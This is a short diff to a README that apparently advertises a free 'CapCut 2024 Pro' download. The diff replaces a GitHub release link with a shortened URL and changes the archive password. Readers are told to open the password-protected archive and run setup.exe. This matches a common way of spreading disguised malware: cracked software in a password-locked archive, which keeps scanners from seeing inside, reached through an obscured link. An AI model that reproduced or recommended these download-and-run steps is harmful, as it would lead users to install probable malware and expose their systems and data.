@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install</H3>
 
-- [Download](https://github.com/Ballinrobe/capcut-2024-pro-download/releases/download/download/CapCutP24.rar)
-- Open archive (password: capcut4)
+- [Download](https://goo.su/IbA2a)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
